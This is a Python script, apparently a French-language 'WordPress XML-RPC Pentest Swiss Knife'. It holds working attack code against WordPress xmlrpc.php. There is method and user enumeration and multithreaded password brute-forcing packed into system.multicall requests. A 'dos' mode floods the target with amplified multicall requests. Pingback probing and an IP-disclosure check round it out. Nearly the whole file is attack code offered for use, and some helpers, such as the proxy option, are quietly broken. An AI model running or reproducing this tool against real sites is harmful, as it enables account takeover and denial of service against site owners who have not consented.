#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ExRPC v3.0 - WordPress XML-RPC Pentest Swiss Knife (2026)
Auteur : Toi + améliorations Grok
Usage : python xmlrpcXploit.py http://target.com/ --mode scan
Modes : scan, enum-methods, enum-users, brute, dos, pingback, ip-disclosure
"""

import sys
import argparse
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional, List
import time
import warnings
from tqdm import tqdm  # Pour les progress bars
from tabulate import tabulate  # Pour afficher des tables visuelles
import logging
import socket  # Pour IP disclosure test

# Désactive les avertissements SSL (seulement pour les tests)
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

# ─── Couleurs ANSI ───────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
ENDC   = "\033[0m"

# ─── Configuration ───────────────────────────────────────────────────────────
TIMEOUT = 15
MAX_WORKERS = 20
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
REQUESTS_PER_THREAD = 200  # pour le DoS
CHUNK_SIZE = 500  # pour bruteforce
LOG_FILE = "exrpc_log.txt"

# Setup logging
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def banner():
    print(r"""
     __      ___       __    __   ___      _        ___   _  _ 
    /\ \    / (_)_ __ / _\  / _| / __\ ___| |_ ___ / _ \ | || |
   /  \ \  / /| | '_ \\ \  | |_ // _\ / __| __/ __| | | || || |_
  / /\ \ \/ / | | | | |\ \ |  _// /  \__ \ || (__| |_| ||__   _|
  \____/\__/  |_|_| |_|\__\/|_| /___/ |___/\__\___|\___/   |_|  
                                                                
    WordPress XML-RPC Pentest Swiss Knife - v3.0
    """)

def is_xmlrpc_available(base_url: str) -> bool:
    """Vérifie si xmlrpc.php est accessible et fonctionnel"""
    url = base_url.rstrip("/") + "/xmlrpc.php"
    payload = """<?xml version="1.0"?>
    <methodCall>
      <methodName>system.listMethods</methodName>
    </methodCall>"""

    try:
        r = requests.post(
            url,
            data=payload,
            headers={"User-Agent": USER_AGENT},
            timeout=TIMEOUT,
            verify=False
        )
        logging.info(f"Checked XML-RPC availability: status {r.status_code}")
        if r.status_code != 200:
            return False
        text = r.text.lower()
        return "faultcode" not in text and "wp.getusersblogs" in text
    except Exception as e:
        logging.error(f"Error checking availability: {e}")
        return False

def enum_methods(base_url: str) -> List[str]:
    """Énumère les méthodes disponibles via system.listMethods"""
    url = base_url.rstrip("/") + "/xmlrpc.php"
    payload = """<?xml version="1.0"?>
    <methodCall>
      <methodName>system.listMethods</methodName>
    </methodCall>"""

    try:
        r = requests.post(url, data=payload, headers={"User-Agent": USER_AGENT}, timeout=TIMEOUT, verify=False)
        if r.status_code == 200:
            methods = [m.strip() for m in r.text.split("<string>")[1:] if m.strip()]
            methods = [m.split("</string>")[0] for m in methods if "</string>" in m]
            logging.info(f"Enumerated {len(methods)} methods")
            return methods
        return []
    except Exception as e:
        logging.error(f"Error enumerating methods: {e}")
        return []

def enum_users(base_url: str) -> List[dict]:
    """Énumère les utilisateurs via wp.getUsers (nécessite auth, mais test basique sans)"""
    url = base_url.rstrip("/") + "/xmlrpc.php"
    payload = """<?xml version="1.0"?>
    <methodCall>
      <methodName>wp.getUsers</methodName>
      <params>
        <param><value><int>1</int></value></param>  <!-- blog_id -->
        <param><value><string>dummy</string></value></param>  <!-- username -->
        <param><value><string>dummy</string></value></param>  <!-- password -->
        <param><value><int>10</int></value></param>  <!-- max users -->
      </params>
    </methodCall>"""

    try:
        r = requests.post(url, data=payload, headers={"User-Agent": USER_AGENT}, timeout=TIMEOUT, verify=False)
        if "Incorrect username or password" in r.text or r.status_code == 200:
            # Parser simple des users si succès (heuristique)
            users = []
            for part in r.text.split("<struct>"):
                if "user_login" in part:
                    user = {}
                    user['login'] = part.split("<string>")[1].split("</string>")[0]
                    users.append(user)
            logging.info(f"Enumerated {len(users)} users")
            return users
        return []
    except Exception as e:
        logging.error(f"Error enumerating users: {e}")
        return []

def test_pingback(base_url: str, test_url: str = "http://example.com") -> str:
    """Teste pingback.ping pour SSRF ou autres"""
    url = base_url.rstrip("/") + "/xmlrpc.php"
    payload = f"""<?xml version="1.0"?>
    <methodCall>
      <methodName>pingback.ping</methodName>
      <params>
        <param><value><string>{test_url}</string></value></param>
        <param><value><string>{base_url}</string></value></param>
      </params>
    </methodCall>"""

    try:
        r = requests.post(url, data=payload, headers={"User-Agent": USER_AGENT}, timeout=TIMEOUT, verify=False)
        logging.info(f"Pingback test response: {r.status_code}")
        return r.text
    except Exception as e:
        logging.error(f"Error testing pingback: {e}")
        return str(e)

def ip_disclosure(base_url: str) -> str:
    """Tente de révéler l'IP réelle via XML-RPC (high-level check)"""
    url = base_url.rstrip("/") + "/xmlrpc.php"
    try:
        # Utilise socket pour comparer IPs
        apparent_ip = requests.get(base_url, timeout=TIMEOUT).headers.get('X-Real-IP', socket.gethostbyname(url.split('//')[1].split('/')[0]))
        xmlrpc_ip = requests.post(url, data="<xml></xml>", timeout=TIMEOUT, verify=False).headers.get('Server', apparent_ip)
        logging.info(f"IP disclosure check: apparent {apparent_ip}, xmlrpc {xmlrpc_ip}")
        if apparent_ip != xmlrpc_ip:
            return f"Possible IP disclosure: {xmlrpc_ip}"
        return "No disclosure detected"
    except Exception as e:
        logging.error(f"Error in IP disclosure: {e}")
        return str(e)

def generate_multicall_payload(username: str, passwords: List[str]) -> str:
    """Génère un payload system.multicall pour tester plusieurs mots de passe d'un coup"""
    calls = []
    for pwd in passwords:
        calls.append(f"""
        <value>
          <struct>
            <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
            <member><name>params</name><value><array><data>
              <value><string>{username}</string></value>
              <value><string>{pwd.replace('&', '&amp;').replace('<', '&lt;')}</string></value>
            </data></array></value></member>
          </struct>
        </value>""")

    return f"""<?xml version="1.0"?>
    <methodCall>
      <methodName>system.multicall</methodName>
      <params><param><value><array><data>{''.join(calls)}</data></array></value></param></params>
    </methodCall>"""

def try_chunk(session: requests.Session, url: str, username: str, pw_chunk: List[str]) -> Optional[str]:
    """Tente un chunk de mots de passe via multicall"""
    payload = generate_multicall_payload(username, pw_chunk)
    try:
        r = session.post(url, data=payload, timeout=TIMEOUT)
        if "<boolean>1</boolean>" in r.text or "isAdmin" in r.text:
            for pwd in pw_chunk:
                if f">{pwd}<" in r.text or f">{pwd.replace('&', '&amp;')}<" in r.text:
                    return pwd
        return None
    except:
        return None

def bruteforce(base_url: str, username: str, wordlist_path: str):
    url = base_url.rstrip("/") + "/xmlrpc.php"
    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})

    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{RED}[!] Fichier {wordlist_path} introuvable{ENDC}")
        sys.exit(1)

    print(f"{BLUE}[*] Bruteforce de '{username}' avec {len(passwords)} mots de passe...{ENDC}")
    print(f"{YELLOW}[*] Utilisation de system.multicall (jusqu'à {CHUNK_SIZE} essais par requête){ENDC}")

    chunks = [passwords[i:i + CHUNK_SIZE] for i in range(0, len(passwords), CHUNK_SIZE)]

    with tqdm(total=len(chunks), desc="Progression bruteforce", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} chunks") as pbar:
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = [executor.submit(try_chunk, session, url, username, chunk) for chunk in chunks]
            for future in as_completed(futures):
                result = future.result()
                pbar.update(1)
                if result:
                    print(f"\n{GREEN}[+] MOT DE PASSE TROUVÉ !{ENDC}")
                    print(f"{GREEN}[+] Username : {username}{ENDC}")
                    print(f"{GREEN}[+] Password : {result}{ENDC}")
                    logging.info(f"Password found: {result}")
                    return

    print(f"{RED}[!] Aucun mot de passe valide trouvé.{ENDC}")

def dos_amplification(base_url: str, threads: int = 50):
    url = base_url.rstrip("/") + "/xmlrpc.php"
    print(f"{YELLOW}[!] Lancement du DoS par amplification XML-RPC (system.multicall)...{ENDC}")
    print(f"{YELLOW}[!] {threads} threads, {REQUESTS_PER_THREAD} requêtes par thread{ENDC}")

    payload = generate_multicall_payload("admin", ["wrongpass"] * 500)  # 500 essais par requête

    def worker():
        s = requests.Session()
        s.headers.update({"User-Agent": USER_AGENT})
        for _ in range(REQUESTS_PER_THREAD):
            try:
                s.post(url, data=payload, timeout=10, verify=False)
            except:
                pass

    with tqdm(total=threads, desc="Progression DoS", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} threads") as pbar:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]
            for future in as_completed(futures):
                future.result()
                pbar.update(1)

def scan_mode(base_url: str):
    """Mode scan : exécute tous les tests basiques"""
    print(f"{BLUE}[*] Mode Scan activé...{ENDC}")
    
    # Enum methods
    methods = enum_methods(base_url)
    if methods:
        print(f"{GREEN}[+] Méthodes disponibles :{ENDC}")
        table = [[i+1, method] for i, method in enumerate(methods[:20])]  # Limite à 20 pour visibilité
        print(tabulate(table, headers=["#", "Méthode"], tablefmt="grid"))
        if len(methods) > 20:
            print(f"{YELLOW}[...] {len(methods) - 20} méthodes supplémentaires (voir log){ENDC}")
    
    # Enum users
    users = enum_users(base_url)
    if users:
        print(f"{GREEN}[+] Utilisateurs énumérés :{ENDC}")
        table = [[user.get('login', 'Unknown')] for user in users]
        print(tabulate(table, headers=["Username"], tablefmt="grid"))
    
    # Pingback test
    pingback_resp = test_pingback(base_url)
    print(f"{YELLOW}[*] Test Pingback : {pingback_resp[:100]}...{ENDC}")
    
    # IP disclosure
    disclosure = ip_disclosure(base_url)
    print(f"{YELLOW}[*] IP Disclosure : {disclosure}{ENDC}")

def main():
    banner()
    parser = argparse.ArgumentParser(description="ExRPC - WordPress XML-RPC Pentest Swiss Knife")
    parser.add_argument("target", help="URL cible (ex: http://example.com/)")
    parser.add_argument("--mode", choices=["scan", "enum-methods", "enum-users", "brute", "dos", "pingback", "ip-disclosure"], required=True, help="Mode d'opération")
    parser.add_argument("--user", help="Nom d'utilisateur pour brute")
    parser.add_argument("--wordlist", help="Chemin wordlist pour brute")
    parser.add_argument("--threads", type=int, default=50, help="Threads pour DoS")
    parser.add_argument("--proxy", help="Proxy (ex: http://127.0.0.1:8080)")

    args = parser.parse_args()

    # Support proxy
    if args.proxy:
        proxies = {"http": args.proxy, "https": args.proxy}
        requests.proxies = proxies
        print(f"{YELLOW}[*] Utilisation du proxy : {args.proxy}{ENDC}")

    print(f"{BLUE}Cible : {args.target}{ENDC}")

    if not is_xmlrpc_available(args.target):
        print(f"{RED}[!] XML-RPC non disponible ou protégé.{ENDC}")
        sys.exit(1)

    print(f"{GREEN}[+] XML-RPC détecté !{ENDC}")

    if args.mode == "scan":
        scan_mode(args.target)
    elif args.mode == "enum-methods":
        methods = enum_methods(args.target)
        print(tabulate([[m] for m in methods], headers=["Méthodes"], tablefmt="fancy_grid"))
    elif args.mode == "enum-users":
        users = enum_users(args.target)
        print(tabulate([[u.get('login')] for u in users], headers=["Users"], tablefmt="fancy_grid"))
    elif args.mode == "brute":
        if not args.user or not args.wordlist:
            print(f"{RED}[!] --user et --wordlist obligatoires pour brute{ENDC}")
            sys.exit(1)
        bruteforce(args.target, args.user, args.wordlist)
    elif args.mode == "dos":
        dos_amplification(args.target, args.threads)
    elif args.mode == "pingback":
        resp = test_pingback(args.target)
        print(f"{YELLOW}[*] Réponse Pingback :{ENDC} {resp}")
    elif args.mode == "ip-disclosure":
        resp = ip_disclosure(args.target)
        print(f"{YELLOW}[*] Résultat IP Disclosure :{ENDC} {resp}")

if __name__ == "__main__":
    main()